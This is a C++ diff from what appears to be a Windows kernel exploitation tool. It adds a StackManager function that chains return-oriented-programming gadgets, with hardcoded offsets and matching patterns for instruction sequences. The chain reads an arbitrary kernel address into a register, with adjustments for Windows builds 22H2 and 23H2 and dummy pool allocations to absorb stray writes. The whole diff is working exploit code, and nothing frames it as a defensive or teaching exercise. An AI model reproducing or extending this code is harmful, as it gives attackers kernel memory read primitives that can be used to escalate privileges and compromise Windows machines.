@@ -33,6 +33,32 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
 }
 
+void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
+{
+    // TODO: Remove this from here
+    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
+
+    this->AddGadget(0xbac75c, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    this->AddValue(ReadAddress, "read address");
+    this->AddPadding(0x18);
+
+    this->AddGadget(0x27af45, "mov rax, qword ptr \[rax\]; ret;");
+    this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
+    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+        this->AddPadding(0x28);
+
+    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
+    // to a valid memory dummy pool so that it writes there.
+    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    this->AddPadding(0x10);
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddPadding(0x8);
+    this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddPadding(0x28);
+    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
+}
+
 void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
 {
 	this->AddFunctionCall("PsGetCurrentThread");
